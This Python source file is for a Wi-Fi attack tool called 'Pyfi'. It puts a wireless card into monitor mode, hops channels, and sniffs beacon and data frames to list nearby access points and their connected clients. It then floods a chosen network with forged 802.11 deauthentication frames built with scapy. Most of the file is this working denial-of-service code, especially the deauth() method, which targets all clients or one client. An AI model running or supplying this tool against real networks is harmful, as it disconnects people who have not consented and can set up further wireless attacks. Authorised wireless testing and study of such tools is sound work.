#!/usr/bin/python3

#  TODO: Source most up-to-date vendor database. Find a way to keep it updated.
#  TODO: Incorporate all argparse parsed arguments from utils.py
#  TODO: Fix bug when quitting during sniffing phase

import os
import re
import sys
import signal
import curses
import logging
import traceback
from time import sleep
from utils import *
from triggerlist import TriggerList
from subprocess import Popen, PIPE
from threading import Thread, Lock, Event
from scapy.all import *

# set scapy verbosity to zero
conf.verb = 0

# silence unwanted scapy output
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
BROADCAST_ADDR = "FF:FF:FF:FF:FF:FF"


class INFO:
    AP = 0
    CLIENT = 1
    SETUP = 3
    PROMPT = 4
    INPUT = 5


class Pyfi:

    def __init__(self, interface, args):

        self.args = args

        # Set curses screen object
        self.screen, self.window = start_curses()

        # Set scapy sniff interface
        conf.iface = interface
        self.iface = interface
        self.monitor_mode = False

        # Compile list of vendors
        self.vendors = compile_vendors()

        self.ap_dict = dict()
        self.ap_clients = dict()
        self.all_bssid = list()
        self.lock = Lock()

        self.main_display = TriggerList(self.update_display)
        self.target_ap = dict()
        self.target_client = None
        self.target_id = None

        self.thread_channel_hop = Thread(
            target=self.channel_hop,
            args=(str(self.iface),))
        self.thread_channel_hop.daemon = True

        # Stop channel hopper when cleared
        # Starts channel hopper when set
        self.hop_channels = Event()
        self.hop_channels.set()

        # Thread to listen for user input in curses
        self.input_thread = Thread(target=self.fetch_input)
        self.input_thread.daemon = True

        self.sniffer_active_event = Event()
        self.sniffer_active_event.set()

        # AP sniffer Thread
        self.sniff_ap_thread = Thread(
            target=sniff, kwargs={
                'prn': self.sniff_access_points,
                'iface': conf.iface,
                'store': 0})

        self.sniff_ap_thread.daemon = True

        # Client sniffer Thread
        self.sniff_clients_thread = Thread(
            target=sniff,
            kwargs={
                'prn': self.sniff_clients,
                'iface': conf.iface,
                'store': 0})

        # A flag to indicate deauth is in progress
        self.deauth_active = False

        # Flag indicating user is choosing deauth option
        self.choosing = False

        # Holds the users menu choice as integer
        self.choice = None

    def fetch_input(self):
        while True:
            user_input = self.screen.getch()
            user_input = chr(user_input)

            if user_input == 'q':
                self.sniffer_active_event.clear()
                self.deauth_active = False
                sleep(1)
                stop_mon(self.iface)
                self.monitor_mode = False
                break

            if user_input == 's':
                if self.deauth_active:
                    # Stop deauthentication
                    self.deauth_active = False
                elif self.sniffer_active_event.is_set():
                    self.sniffer_active_event.clear()
                else:
                    pass

            if user_input.isdigit():
                if self.choosing:
                    self.choice = user_input
                    self.choosing = False
                else:
                    self.target_id = int(user_input)

    def update_display(self):
        self.window.erase()
        self.refresh_screen()

        for line in self.main_display:
            self.to_window(line)

        self.refresh_screen()

    def refresh_screen(self):
        self.window.noutrefresh()
        curses.doupdate()

    def to_window(self, text):
        self.window.addstr(text)
        self.refresh_screen()

    def interface_setup(self):
        self.output(f"[+] Putting {self.iface} into MONITOR mode...\n")
        self.output(f"[+] Stopping any interfering processes...\n")

        try:
            start_mon(self.iface)
            self.monitor_mode = True
        except Exception as e:
            self.error(e)

    def start_threads(self):
        # Start daemon threads
        self.thread_channel_hop.start()
        self.input_thread.start()

    def start_sniff(self):
        """
        Start sniffing for access points and any connected clients
        """

        self.output("[+] Sniffing Access Points on all channels\n")
        self.output("[+] Press 's' to stop and show summary. 'q' to quit\n")
        self.output(print_headers())

        self.sniff_ap_thread.start()
        self.sniff_clients_thread.start()

        # Wait for user to end client sniffing phase
        # TODO: This seems very inelegant, fix this
        while self.sniffer_active_event.is_set():
            self.check_exit()
            pass

        sleep(2)
        self.show_summary()

    def show_summary(self, client=False):
        # Output a very simple summary of findings
        self.output(horizontal_rule(30))
        if client:
            self.output(f"Clients discovered: {len(self.ap_clients)}\n\n")
        else:
            self.output(f"Access Points discovered: {len(self.ap_dict)}\n\n")

        if not self.args.targeted:
            self.output("Press 'q' to quit\n")

    def deauth_menu_choice(self):
        self.output(choice_string())
        self.choosing = True
        while self.choosing and self.choice is None:
            self.check_exit()
            pass

    def start_deauth(self):
        self.deauth_menu_choice()

        # Deauth all clients from AP
        if self.choice == '1':
            self.choice = None
            self.deauth()

        elif self.choice == '2':
            self.choice = None
            self.phase = 'client'
            self.start_sniff()
            self.select_target()
            self.deauth(deauth_all=False)

    def select_target(self, client=False):
        self.target_id = None
        self.output(horizontal_rule(30))
        self.output(f"\n[*] Press 'q' to quit.\n")
        self.output(f"[?] Enter ID of the {'client' if client else 'AP'} you wish to target: ")

        # TODO: There may be a better way
        # Waiting for user input
        while self.target_id is None:
            # Check if 'q' has been pressed to quit
            self.check_exit()
            pass

        self.output(str(self.target_id))

        if client:
            self.target_client = self.ap_dict[self.target_ap]['clients'][self.target_id-1]
        else:
            self.target_ap = [ap for ap in self.ap_dict if self.ap_dict[ap]['id'] == self.target_id][0]
            self.display_ap_details()

    def display_client_details(self):
        self.output(horizontal_rule(30))
        self.output(f"Targeting Client: [{self.target_client}]\n")
        self.output(horizontal_rule(30))

    def display_ap_details(self):
        outputs = [
            horizontal_rule(30),
            f"\nSelected Access Point [{self.target_id}]\n",
            f"\tssid:\t\t{self.ap_dict[self.target_ap]['ssid']}\n",
            f"\tbssid:\t\t{self.target_ap}\n",
            f"\tchannel:\t{self.ap_dict[self.target_ap]['channel']}\n",
            horizontal_rule(30)]

        for line in outputs:
            self.output(line)

    def run(self):

        # clear screen
        self.screen.clear()
        self.refresh_screen()

        try:
            self.interface_setup()
            self.start_threads()
            self.start_sniff()
            if self.args.targeted:
                self.select_target()
                self.start_deauth()
            else:
                while True:
                    self.check_exit()

        except Exception as e:
            self.error(e)

        except KeyboardInterrupt:
            pass

        finally:
            self.exit_application()

    def deauth(self, deauth_all=True):
        """
        create deauth packets and send them to the target AP
        """
        # Stop adding APs/Clients to ap_dict
        self.sniffer_active_event.clear()
        sleep(2)

        self.deauth_active = True
        channel = str(self.ap_dict[self.target_ap]['channel'])

        if deauth_all:
            self.output(f"\n[*] Deauthenticating ALL clients from {self.target_ap} on channel {channel}...\n")
        else:
            self.output(f"[*] Deauth {self.target_client} from {self.target_ap} on channel {channel}...\n")

        self.output("[*] Press 's' to stop. 'q' to quit.\n")

        try:
            # Pause channel hopping
            self.hop_channels.clear()
            # Switch to target's channel
            go_to_chan = Popen(['iw', 'dev', 'wlan0', 'set', 'channel', channel], stdout=PIPE)
            go_to_chan.communicate()

            packets = []

            if deauth_all:
                deauth_to_bcast = Dot11(
                    type=0,
                    subtype=12,
                    addr1=BROADCAST_ADDR,
                    addr2=self.target_ap,
                    addr3=self.target_ap)/Dot11Deauth()

                packets.append(deauth_to_bcast)

                for client in self.ap_dict[self.target_ap]['clients']:
                    deauth_to = Dot11(
                        type=0,
                        subtype=12,
                        addr1=client,
                        addr2=self.target_ap,
                        addr3=self.target_ap)/Dot11Deauth()

                    deauth_from = Dot11(
                        type=0,
                        subtype=12,
                        addr1=self.target_ap,
                        addr2=client,
                        addr3=client)/Dot11Deauth()

                    packets.extend([deauth_to, deauth_from])

            else:
                deauth_to_client = Dot11(
                    type=0,
                    subtype=12,
                    addr1=self.target_client,
                    addr2=self.target_ap,
                    addr3=self.target_ap)/Dot11Deauth()

                deauth_to_ap = Dot11(
                    type=0,
                    subtype=12,
                    addr1=self.target_ap,
                    addr2=self.target_client,
                    addr3=self.target_client)/Dot11Deauth()

                packets.extend([deauth_to_ap, deauth_to_client])

            # create deauth packet for AP and add to list
            # deauth_pkt = dot11/Dot11Deauth() #RadioTap() / dot11 / Dot11Deauth(reason=7)

            # send it
            # TODO: Use of a for loop for this is unconventional,
            # instead use the count argument to set number of packets. However,
            # for now I found this to be more reliable.
            try:
                while self.deauth_active:
                    self.output(".")
                    for pkt in packets:
                        if not self.deauth_active:
                            break
                        sendp(pkt, inter=self.args.delay, count=self.args.packets, iface=conf.iface)

            except KeyboardInterrupt:
                pass

            except Exception as e:
                pass
                #self.error(e)
                #self.exit_application()
                #sys.exit(0)

            self.output("\n[*] Deauthentication Complete\n")
            return

        except Exception as e:
            self.error(e)

    def sniff_access_points(self, pkt):
        """
        Sniff packets, and extract info from them
        addr1=destination, addr2=source, addr3=transmitter
        """
        # Here scapy is going to check whether each sniffed packet
        # has particular 'layers' of encapsulation and act accordingly

        if self.sniffer_active_event.is_set():
            if pkt.haslayer(Dot11):
                # Check for beacon frames or probe responses from AP's
                if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                    # If the packet contains a BSSID we have not encountered
                    if pkt.addr3.upper() not in self.ap_dict:
                        access_point = pkt.addr3.upper()
                        # Add Access-Point to ap_dict
                        self.add_access_point(access_point, pkt)
        else:
            sys.exit(0)

    def sniff_clients(self, pkt):
        if self.sniffer_active_event.is_set():
            if pkt.haslayer(Dot11) and pkt.getlayer(Dot11).type in (1, 2):
                # Packet is a Data or Control Frame
                if pkt.addr1 and pkt.addr2:
                    # Get destination and source MAC addresses
                    dst = pkt.addr1.upper()
                    src = pkt.addr2.upper()

                    # If the target AP is either source or destination, we know the other is a client
                    if BROADCAST_ADDR not in [dst, src]:
                        if src in self.ap_dict and not self.is_client(src, dst):
                            self.add_client(src, dst)
                        elif dst in self.ap_dict and not self.is_client(dst, src):
                            self.add_client(dst, src)
        else:
            sys.exit(0)

    def is_client(self, ap, client):
        return client in self.ap_dict[ap]['clients']

    def add_access_point(self, access_point, pkt):
        try:
            ssid = pkt[3].info.decode()
            if not re.match(r'[\w\-\.]+', ssid):  # Check for valid SSID
                ssid = "*HIDDEN/NONE*"

            # From airoscapy.py (by iphelix)
            # It's decoding the channel info from an awkward hex formatting('/x03' etc.)
            channel = ord(pkt[Dot11Elt:3].info)
            vendor = self.get_vendor(access_point)
            ap_id = len(self.ap_dict) + 1  # No. of AP's collected

            with self.lock:
                self.ap_dict[access_point] = {
                    'id': ap_id, 'ssid': ssid, 'channel': channel, 'vendor': vendor, 'clients': []}

            # Output the AP details
            description = f"\n{ap_id}\t%-20s\t%-20s\t{channel}\t\t%-20s\n" % (ssid, access_point, vendor)
            self.output(description)

        except Exception as e:
            if "ord" in f"{e}":  # TODO This may be to do with 5GHz channels cropping up?
                pass
            else:
                self.error(e)

    def add_client(self, access_point, new_client):
        with self.lock:
            self.ap_dict[access_point]['clients'].append(new_client)

    # TODO move to utils
    def get_vendor(self, bssid):
        try:
            name = self.vendors[bssid[:8]]
            return name
        except KeyError:
            return "unknown device"

    # TODO move to utils
    def channel_hop(self, iface):
        """
        Hop channels until interrupted
        """

        # Total of 13 channels to search through (11 in the US)
        limit = 14

        while True:
            # Effectively pause channel hopping
            if self.hop_channels.is_set():
                for i in range(1, 14):
                    channel = i % limit

                    # using Popen instead of os.system here avoids superfluous
                    # output to the terminal from the iw command
                    # which at times can crash the program (I'm not sure why yet)
                    # Note: I don't seem to need to PIPE any outputs(stdout etc.) for this to work

                    p = Popen(["iw", "dev", iface, "set", "channel", str(channel)])
                    try:
                        # if event is cleared, pause channel hopping
                        if not self.hop_channels.is_set():
                            break
                        p.communicate()
                        sleep(1)  # TODO -- Experiment with different values
                    except Exception as e:
                        self.error(e)
            else:
                break

    def exit_curses(self):
        # End curses
        curses.nocbreak()
        self.screen.keypad(False)
        curses.echo()
        curses.endwin()

    def check_exit(self):
        if not self.input_thread.is_alive():
            sleep(2)
            raise KeyboardInterrupt

    def exit_application(self):
        try:
            # self.output(f"\n[!!] Putting {self.iface} back into MANAGED mode...\n")
            if self.monitor_mode is not False:
                stop_mon(self.iface)
            self.exit_curses()
            sleep(1)
            sys.exit(0)

        except Exception as e:
            self.error(e)

    def signal_handler(self, sig, stack_frame):
        """
        This handles an interrupt signal, like
        Ctrl-C. Once detected, the program will sleep
        So we can 'get our affairs in order'
        """
        sleep(1)
        self.exit_application()

    def error(self, error):
        self.output(f"[!] Error: {error}\n")
        log_error_to_file(traceback.format_exc())
        sys.exit(0)

    def output(self, msg):
        self.main_display.append(msg)


if __name__ == "__main__":

    if os.geteuid() != 0:
        print("[!] Must be run as root")
        sys.exit(0)

    # Get arguments
    args = parse_args()

    if args.interface:
        iface = args.interface
    else:
        iface = get_wlan_interface()

    # Clear log file
    with open('log', 'w') as f:
        f.write('')

    pyfi = Pyfi(iface, args)

    # Set the signal handler
    signal.signal(signal.SIGINT, pyfi.signal_handler)

    try:
        pyfi.run()
    except Exception as e:
        log_error_to_file(traceback.format_exc())
    except KeyboardInterrupt:
        pass
